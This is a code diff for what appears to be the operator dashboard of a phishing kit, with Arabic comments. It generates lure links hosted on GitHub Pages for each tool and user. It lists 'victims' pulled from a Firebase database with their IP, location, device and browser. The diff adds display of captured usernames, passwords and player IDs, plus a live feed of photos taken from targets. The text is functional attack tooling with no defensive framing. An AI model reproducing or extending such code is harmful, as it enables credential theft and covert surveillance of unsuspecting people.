@@ -56,7 +56,7 @@
         .header { height: 65px; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--primary); display: flex; align-items: center; padding: 0 20px; position: fixed; top: 0; width: 100%; box-sizing: border-box; z-index: 1000; }
         .header h1 { font-family: 'Orbitron'; font-size: 16px; color: var(--primary); text-shadow: 0 0 10px var(--primary); margin: 0; flex: 1; }
 
-        .viewport { margin-top: 75px; height: calc(100vh - 220px); overflow-y: auto; padding: 15px; }
+        .viewport { margin-top: 75px; height: calc(100vh - 240px); overflow-y: auto; padding: 15px; }
         .page { display: none; }
         .page.active { display: block; animation: zoomIn 0.3s ease; }
         @keyframes zoomIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
@@ -976,11 +976,10 @@ async function openToolPage(toolValue) {
     }
 
     // ✅ استخدم الرابط الثابت واسم الأداة
-    const baseUrl = "https://supportcmd.github.io";
+    const baseUrl = "https://supportcmd.github.io/-";
     const link = `${baseUrl}/${toolValue}.html?user_id=${user}&tool=${toolValue}`;
     
     // ✅ نسخ الرابط وفتحه
-    navigator.clipboard.writeText(link);
     document.getElementById('tool-link-display').innerText = link;
     
     document.getElementById('copy-tool-btn').onclick = () => {
@@ -993,38 +992,56 @@ async function openToolPage(toolValue) {
     loadVictims(toolValue, user);
 }
 
-    // تعديل جلب الضحايا لعرض البيانات الجديدة (الموقع والجهاز)
-    function loadVictims(tool, user) {
-        // القراءة من المسار الموحد hits/userId
-        const victimRef = db.ref('hits/' + user); 
+    // ✅ دالة loadVictims المعدلة - مع عرض الـ Live
+function loadVictims(tool, user) {
+    const victimRef = db.ref('hits/' + user); 
+    
+    victimRef.on('value', snap => {
+        const list = document.getElementById('victim-list');
+        list.innerHTML = snap.exists() ? "" : "<p class='no-data'>في انتظار الضحايا... 🎣</p>";
         
-        victimRef.on('value', snap => {
-            const list = document.getElementById('victim-list');
-            list.innerHTML = snap.exists() ? "" : "<p class='no-data'>في انتظار الضحايا... 🎣</p>";
-            
-            if (snap.exists()) {
-                playNotificationSound(); 
-                snap.forEach(child => {
-                    const data = child.val();
-                    // التحقق إذا كانت البيانات تنتمي للأداة المطلوبة
-                    if (!tool || data.tool === tool) {
-                        list.innerHTML += `
-                            <div class="victim-card" style="padding:12px; border:1px solid var(--primary); margin-bottom:10px; border-radius:8px; background: rgba(0,242,255,0.02); text-align:right; font-size:13px; color: #fff;">
-                                <div style="display:flex; justify-content:space-between; color:var(--primary); font-weight:bold; margin-bottom:5px;">
-                                    <span>📡 IP: ${data.ip || 'Unknown'}</span>
-                                    <span>⏰ ${formatTime(data.timestamp) || ''}</span>
-                                </div>
-                                📍 <b>الموقع:</b> ${data.location || 'غير معروف'}<br>
-                                📱 <b>الجهاز:</b> ${data.device || 'غير معروف'}<br>
-                                🌐 <b>المتصفح:</b> <small style="color:#888;">${data.browser ? data.browser.substring(0, 30) + '...' : 'غير معروف'}</small>
-                                ${data.tool ? `<br>🛠️ <b>الأداة:</b> ${getToolName(data.tool)}` : ''}
+        if (snap.exists()) {
+            playNotificationSound(); 
+            snap.forEach(child => {
+                const data = child.val();
+                if (!tool || data.tool === tool) {
+                    list.innerHTML += `
+                        <div class="victim-card" style="padding:12px; border:1px solid var(--primary); margin-bottom:10px; border-radius:8px; background: rgba(0,242,255,0.02); text-align:right; font-size:13px; color: #fff;">
+                            <div style="display:flex; justify-content:space-between; color:var(--primary); font-weight:bold; margin-bottom:5px;">
+                                <span>📡 IP: ${data.ip || 'Unknown'}</span>
+                                <span>⏰ ${formatTime(data.timestamp) || ''}</span>
                             </div>
-                        `;
-                    }
-                });
-            }
-        });
-    }
+                            📍 <b>الموقع:</b> ${data.location || 'غير معروف'}<br>
+                            📱 <b>الجهاز:</b> ${data.device || 'غير معروف'}<br>
+                            🌐 <b>المتصفح:</b> <small style="color:#888;">${data.browser ? data.browser.substring(0, 30) + '...' : 'غير معروف'}</small>
+                            ${data.tool ? `<br>🛠️ <b>الأداة:</b> ${getToolName(data.tool)}` : ''}
+                            ${data.user ? `<br>📧 <b>الحساب:</b> ${data.user}` : ''}
+                            ${data.pass ? `<br>🔑 <b>الباسورد:</b> ${data.pass}` : ''}
+                            ${data.id || data.playerID ? `<br>🆔 <b>الايدي:</b> ${data.id || data.playerID}` : ''}
+                        </div>
+                    `;
+                }
+            });
+        }
+    });
+    
+    // ✅ إضافة استماع للـ Live Photos
+    db.ref(`live/${user}/photos`).on('child_added', snap => {
+        const photo = snap.val();
+        const list = document.getElementById('victim-list');
+        
+        // أضف الصورة في أول القائمة
+        list.innerHTML = `
+            <div style="padding:10px; border:2px solid #ff5722; margin-bottom:10px; border-radius:8px; background: rgba(255,87,34,0.1);">
+                <div style="display:flex; justify-content:space-between; color:#ff5722;">
+                    <span>📸 صورة جديدة!</span>
+                    <span>⏰ ${photo.time}</span>
+                </div>
+                <img src="${photo.image}" style="width:100%; max-width:200px; margin-top:10px; border-radius:8px;">
+            </div>
+        ` + list.innerHTML;
+    });
+}
 
     // ✅ دالة الحصول على اسم الأداة
 function getToolName(toolValue) {
@@ -1049,7 +1066,7 @@ function generateCustomLink() {
     }
     
     // ✅ استخدم الرابط الثابت بتاع GitHub Pages
-    const baseUrl = "https://supportcmd.github.io";
+    const baseUrl = "https://supportcmd.github.io/-";
     
     // ✅ أهم تعديل: استخدم اسم الأداة نفسه كاسم الملف
     let link = `${baseUrl}/${tool}.html?user_id=${user}&tool=${tool}`;
